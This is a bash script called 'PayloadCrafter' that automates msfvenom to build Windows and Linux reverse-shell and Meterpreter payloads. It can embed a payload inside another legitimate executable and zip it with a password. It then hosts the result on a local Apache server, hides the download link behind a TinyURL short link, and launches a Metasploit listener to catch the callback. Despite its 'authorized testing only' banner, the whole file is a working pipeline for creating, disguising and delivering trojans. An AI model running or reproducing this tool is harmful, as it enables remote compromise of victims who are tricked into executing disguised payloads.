#!/bin/bash
#
# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
RESET='\033[0m'

# Symbols
TICK="${GREEN}[✔]${RESET}"
CROSS="${RED}[✘]${RESET}"
INFO="${BLUE}[ℹ]${RESET}"
WARN="${YELLOW}[!]${RESET}"
QUESTION="${CYAN}[?]${RESET}"

echo -e "${CYAN}"
echo '██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗  ██████╗██████╗  █████╗ ███████╗████████╗███████╗██████╗   ██╗   ██╗ ██╗'
echo '██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗  ██║   ██║███║'
echo '██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║██║     ██████╔╝███████║█████╗     ██║   █████╗  ██████╔╝  ██║   ██║╚██║'
echo '██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║██║     ██╔══██╗██╔══██║██╔══╝     ██║   ██╔══╝  ██╔══██╗  ╚██╗ ██╔╝ ██║'
echo '██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝╚██████╗██║  ██║██║  ██║██║        ██║   ███████╗██║  ██║██╗╚████╔╝  ██║'
echo '╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝ ╚═══╝   ╚═╝'
echo -e "${RESET}"


echo -e "${YELLOW}=================================================================================${RESET}"
echo -e "${RED}  WARNING:${RESET} This tool is for ${YELLOW}educational and authorized penetration testing${RESET} only."
echo -e "  Unauthorized use of this script may be ${RED}illegal${RESET} and is strictly discouraged."
echo -e "${CYAN}  Author:${RESET} ${GREEN}Shahar Ben-David${RESET}"
echo -e "${YELLOW}=================================================================================${RESET}\n"


rm -f new_payload options 2>/dev/null

# Check Module
check_module() {
    local cmd="$1"
    local pkg="$2"

    echo -e "${INFO} Checking for: ${CYAN}$pkg${RESET}"
    sleep 0.5

    if ! command -v "$cmd" &>/dev/null; then
        echo -e "${WARN} $cmd not found. Attempting to install ${CYAN}$pkg${RESET}..."
        if sudo apt-get install -y -qq "$pkg" >/dev/null 2>&1; then
            echo -e "${TICK} ${CYAN}$pkg${RESET} has been installed successfully."
        else
            echo -e "${CROSS} Failed to install ${CYAN}$pkg${RESET}. Please install it manually."
        fi
    else
        echo -e "${TICK} ${CYAN}$pkg${RESET} is already installed."
    fi
    sleep 0.5
}

# Run checks
check_module apache2 apache2
check_module fzf fzf

# Spinner function
spin() {
  local -a marks=('/' '-' '\\' '|')
  while true; do
    for mark in "${marks[@]}"; do
      echo -ne "\r${INFO} ${GREEN}Initializing $1 ${mark}${RESET}"
      sleep 0.1
    done
  done
}

# Create TinyURL
create_tinyurl() {
    local long_url=$1
    local api_token="API-Key"

    response=$(curl -s -X POST "https://api.tinyurl.com/create" \
      -H "Authorization: Bearer $api_token" \
      -H "Content-Type: application/json" \
      -d "{\"url\": \"$long_url\", \"domain\": \"tinyurl.com\"}")

    if command -v jq >/dev/null; then
        short_url=$(echo "$response" | jq -r '.data.tiny_url')
    else
        short_url=$(echo "$response" | grep -oP '(?<="tiny_url":\")[^\"]+' | sed 's/\\\//\//g')
    fi

    if [[ -n "$short_url" ]]; then
        echo -e "${INFO}${BLUE} Short URL: $short_url${RESET}"
    else
        echo "${CROSS}${RED} Failed to create short URL.${RESET}"
        echo "$response"
    fi
}

# Delete all files besides main script
echo -e "${WARN} ${RED}This will delete all files in the folder except this script.${RESET}"
echo -e "$(echo -e "${QUESTION} Are you sure? (Y/N): ")" 
echo -n "> "
read -n 1 confirm
echo
confirm=$(echo "$confirm" | tr '[:lower:]' '[:upper:]')

if [[ "$confirm" == "Y" ]]; then
    for file in *; do
        [[ "$file" != "${0##*/}" ]] && rm -rf -- "$file"
    done
    echo -e "${TICK} ${BLUE}Cleanup complete.${RESET}"
else
    echo -e "${CROSS} ${RED}Skipping cleanup.${RESET}"
fi


# Create payloads
if [[ ! -f Windows_payloads.txt ]]; then
    spin "Windows payloads" &
    SPIN_PID=$!
    disown

    msfvenom -l payloads | grep -i windows | awk '{print $1}' > Windows_payloads.txt

    kill "$SPIN_PID" &>/dev/null
    echo -ne "\r${TICK} ${CYAN} Windows payloads initialized.${RESET}     \n"
fi

if [[ ! -f Linux_payloads.txt ]]; then
    spin "Linux payloads" &
    SPIN_PID=$!
    disown

    msfvenom -l payloads | grep -i linux | awk '{print $1}' > Linux_payloads.txt

    kill "$SPIN_PID" &>/dev/null
    echo -ne "\r${TICK} ${CYAN} Linux payloads initialized.${RESET}      \n"
fi

mapfile -t windows_payloads < <(tr -d '\r' < Windows_payloads.txt)
mapfile -t linux_payloads   < <(tr -d '\r' < Linux_payloads.txt)

top_10_windows_payloads=(
    "windows/meterpreter/reverse_tcp"
    "windows/x64/meterpreter/reverse_tcp"
    "windows/meterpreter/reverse_http"
    "windows/meterpreter/reverse_https"
    "windows/shell/reverse_tcp"
    "windows/x64/shell/reverse_tcp"
    "windows/meterpreter/bind_tcp"
    "windows/meterpreter/reverse_tcp_dns"
    "windows/x64/meterpreter/reverse_tcp_dns"
    "windows/meterpreter_reverse_http"
)

top_10_linux_payloads=(
    "linux/x86/meterpreter/reverse_tcp"
    "linux/x64/meterpreter/reverse_tcp"
    "linux/x64/shell/reverse_tcp"
    "linux/x64/shell_bind_tcp"
    "linux/x64/meterpreter_reverse_http"
    "linux/x64/meterpreter_reverse_https"
    "linux/x64/meterpreter_reverse_dns"
    "linux/x64/shell_reverse_tcp"
    "linux/x86/shell/reverse_tcp"
    "linux/x64/exec"
)
#Select Payload function
select_payload() {
    local os="$1"
    local list_choice selected

    echo -e "${INFO}${BLUE}Choose an option:${RESET}"
    echo -e "${GREEN}1. Top 10 $os payloads${RESET}"
    echo -e "${CYAN}2. All $os payloads${RESET}"
    read -n 1 list_choice
    echo

    if [[ "$list_choice" == "1" ]]; then
        selected=$(printf "%s\n" "${!2}" | fzf --prompt="Choose a payload: ")
    elif [[ "$list_choice" == "2" ]]; then
        selected=$(printf "%s\n" "${!3}" | fzf --prompt="Choose a payload: ")
    else
        echo "Invalid choice. Returning to main menu."
        return 1
    fi

    if [[ -z "$selected" ]]; then
        echo "No payload selected. Exiting."
        exit 1
    fi

    echo -e "${WARN}${BLUE}The payload $selected was selected${RESET}"
    declare -g chosen_payload="$selected"
    return 0
}

while true; do
    echo -e "${INFO} ${YELLOW}Please select target OS${RESET}."
    echo -e "${INFO} Choose target OS: ${BLUE}[${YELLOW}W${BLUE}]indows${RESET} or ${RED}[${CYAN}L${RED}]inux${RESET}"
    echo -n "> "
    read -n 1 os_choice
    echo
    os_choice_upper=$(echo "$os_choice" | tr '[:lower:]' '[:upper:]')

    if [[ "$os_choice_upper" == "W" ]]; then
        select_payload "Windows" top_10_windows_payloads[@] windows_payloads[@] && break
    elif [[ "$os_choice_upper" == "L" ]]; then
        select_payload "Linux" top_10_linux_payloads[@] linux_payloads[@] && break
    else
        echo "${CROSS}${RED}Invalid OS. Try again.${RED}"
    fi
done

if ! msfvenom -p "$chosen_payload" --list-options > options 2>/dev/null; then
    echo "${CROSS} ${RED}Failed to dump options for: $chosen_payload ${RESET}"
    exit 1
fi

#Basic Settings
while true; do
    echo -e "${INFO}${BLUE}Use default basic settings? (Y/N)${RESET}"
    echo -n "> "
    read -n 1 default_basic_settings
    echo
    default_basic_settings_upper=$(echo "$default_basic_settings" | tr '[:lower:]' '[:upper:]')

    echo -n "msfvenom -p $chosen_payload" > new_payload

    if [[ "$default_basic_settings_upper" == "Y" ]]; then
		echo -n " LPORT=4444" >> new_payload
		echo -n " LHOST=$(hostname -I | awk '{print $1}')" >> new_payload
        echo -e "${INFO}${YELLOW}Skipping basic options.${RESET}"
        break
    elif [[ "$default_basic_settings_upper" == "N" ]]; then
        basic_opts=$(awk '/Basic options/ {found=1; next} found && /^[[:space:]]*$/ {exit} found && /^[A-Z][A-Za-z _]+:$/ {exit} found {print $1}' options | grep -Ev '^(Name|----)$')
        for i in $basic_opts; do
            desc=$(grep -w "$i" options | head -n1 | cut -c37-)
            read -p "$(echo -e "${QUESTION} Enter ${CYAN}$i${RESET} [Description: ${YELLOW}$desc${RESET}]: ")" val
            [[ -n "$val" ]] && echo -n " $i=\"$val\"" >> new_payload
        done
        break
    else
        echo -e "${CROSS}${RED}Invalid input. Please enter Y or N.${RESET}"
    fi
done

# Advanced Settings
echo
echo -e "${INFO} ${BLUE}Use default advanced settings? ${YELLOW}(Y/N)${RESET}"
echo -n "> "
read -n 1 default_advanced_settings
echo
default_advanced_settings_upper=$(echo "$default_advanced_settings" | tr '[:lower:]' '[:upper:]')

if [[ "$default_advanced_settings_upper" == "N" ]]; then
    selected=$(awk '/Description:/ {found=1; next} found {print}' options \
        | grep Name -A100 \
        | awk 'NR>2 {printf $1 " - "; for (i=4; i<=NF; i++) printf $i " "; print ""}' \
        | head -n -1 \
        | fzf --prompt="Advanced Option(s) - Press tab to multiselect: " --multi)

    option_names=()
    while IFS= read -r line; do
        option_names+=("$(awk '{print $1}' <<< "$line")")
    done <<< "$selected"

    for opt in "${option_names[@]}"; do
        read -p "$(echo -e "${QUESTION} Enter value for ${CYAN}$opt${RESET} (leave blank to skip): ")" value
        [[ -n "$value" ]] && echo -n " $opt=\"$value\"" >> new_payload
    done
else
    echo -e "${INFO}${YELLOW}Skipping advanced options.${YELLOW}"
fi

#Choose output
while true; do
    read -p "$(echo -e "${QUESTION} Choose output format ${YELLOW}(e.g., exe, dll, raw)${RESET}: ")" format

    if [[ -n "$format" ]]; then
        echo -n " -f $format" >> new_payload
        break
    else
        echo -e "${CROSS}${RED}Format cannot be empty.${RESET}"
    fi
done

#Executable
echo
echo -e "${QUESTION}${BLUE}Hide the payload behind another executable? (Y/N)${RESET}"
echo -n "> "
read -n 1 hide_payload
echo
hide_payload_upper=$(echo "$hide_payload" | tr '[:lower:]' '[:upper:]')

if [[ "$hide_payload_upper" == "Y" ]]; then
    while true; do
        echo
        read -p "$(echo -e "${QUESTION} Please provide the full file path ${YELLOW}(or press ENTER to skip)${RESET}: ")" file_path

        if [[ -z "$file_path" ]]; then
            echo -e "${INFO} Skipping ${YELLOW}-x${RESET} and ${YELLOW}-k${RESET} options."
            break
        elif [[ -f "$file_path" ]]; then
            echo -n " -x $file_path -k" >> new_payload
            echo
            read -p "$(echo -e "${QUESTION} Choose the payload name: ")" payload_name
            echo -n " -o $payload_name.$format" >> new_payload
            break
        else
            echo -e "${CROSS}${RED}File was not found.${RESET}"
        fi
    done

elif [[ "$hide_payload_upper" == "N" ]]; then
    echo
    read -p "$(echo -e "${QUESTION} Choose the payload name: ")" payload_name
    echo -n " -o $payload_name.$format" >> new_payload
fi

echo
fullpayload="$payload_name.$format"

#Staged or Stageless
if [[ "$chosen_payload" =~ (^|/)meterpreter_ || "$chosen_payload" =~ (^|/)shell_ || "$chosen_payload" =~ ^cmd/ ]]; then
    echo -e "${INFO}${YELLOW}Payload is likely Stageless${RESET}"
else
    echo -e "${INFO}${YELLOW}Payload is likely Staged${RESET}"
fi

#Generating Payload
echo -e "${INFO} Generating payload file..."
spin "payload generation" &
SPIN_PID=$!
disown

bash new_payload

kill "$SPIN_PID" &>/dev/null
echo -ne "\r${TICK} ${CYAN} Payload generated successfully.${RESET}     \n"

#Zip
echo -e "${QUESTION} Would you like to zip the file? ${YELLOW}(Y/N)${RESET}"
echo -n "> "
read -n 1 zip
echo
zip_upper=$(echo "$zip" | tr '[:lower:]' '[:upper:]')

if [[ "$zip_upper" == "Y" ]]; then
    echo
    read -p "$(echo -e "${QUESTION} Choose zip name: ")" zip_name
    echo
    echo -e "${QUESTION} Would you like to set a password? ${YELLOW}(Y/N)${RESET}"
    echo -n "> "
    read -n 1 password
    echo
    password_upper=$(echo "$password" | tr '[:lower:]' '[:upper:]')

    if [[ "$password_upper" == "Y" ]]; then
        zip -e "$zip_name.zip" "$fullpayload" 2>/dev/null
    else
        zip "$zip_name.zip" "$fullpayload" 2>/dev/null
    fi

    fullpayload="$zip_name.zip"

fi

#Apache Server
echo -e "${QUESTION} Start up apache2 server? ${YELLOW}(Y/N)${RESET}"
echo -n "> "
read -n 1 start_apache
echo
start_apache_upper=$(echo "$start_apache" | tr '[:lower:]' '[:upper:]')
if [[ "$start_apache_upper" == "Y" ]]; then
    sudo rm -rf /var/www/html/payload
    sudo mkdir -p /var/www/html/payload
    sudo systemctl start apache2
    sudo systemctl restart apache2

    echo
    echo -e "${INFO} Payload hosted at: ${CYAN}http://$(hostname -I | awk '{print $1}')/payload/$payload_name${RESET}"
fi

#Move payload
if [[ -f "$fullpayload" ]]; then
    sudo cp "$fullpayload" /var/www/html/payload/
else
    echo -e "${WARN} ${RED}Warning:${RESET} ${YELLOW}$fullpayload${RESET} not found. Skipping move."
fi


#Listener Creation
lport=$(grep -oE 'LPORT="[0-9]+"' new_payload | cut -d'"' -f2)
payload=$(grep -oP '(?<=-p )\S+' new_payload)
settings=$(grep -oP '\b\w+=(?:"[^"]+"|\S+)' new_payload)

echo "use exploit/multi/handler" > listener.rc
echo "set PAYLOAD $payload" >> listener.rc

for setting in $settings; do
    key=$(cut -d= -f1 <<< "$setting")
    val=$(cut -d= -f2- <<< "$setting" | tr -d '"')
    echo "set $key $val" >> listener.rc
done

echo "set ExitOnSession false" >> listener.rc
echo "exploit -j" >> listener.rc

# Create URL
lhost=$(grep -oP 'LHOST="?([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)"?' new_payload | grep -oP '([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)')
if [[ -z "$lhost" ]]; then
    lhost=$(hostname -I | awk '{print $1}')
    echo -e "${WARN} LHOST not found in new_payload. Defaulting to: ${CYAN}$lhost${RESET}"
fi
payload_url="http://${lhost}/payload/${fullpayload}"
echo -e "${INFO} Creating TinyURL for: ${CYAN}$payload_url${RESET}"
create_tinyurl "$payload_url"

# Startup msfconsole
echo -e "${INFO} Listener script saved at: ${CYAN}$(readlink -f listener.rc 2>/dev/null || echo "$PWD/listener.rc")${RESET}"
echo -e "${INFO} Launching listener with ${YELLOW}msfconsole${RESET}..."
echo -e "${INFO} Launching listener in a new terminal..."
x-terminal-emulator -e "msfconsole -r listener.rc" 2>/dev/null

# End
echo -e "${INFO} Payload command saved to ${CYAN}'new_payload'${RESET}:"
echo -e "${YELLOW}────────────────────────────────────────────────────────${RESET}"
cat new_payload
echo
echo -e "${YELLOW}────────────────────────────────────────────────────────${RESET}"
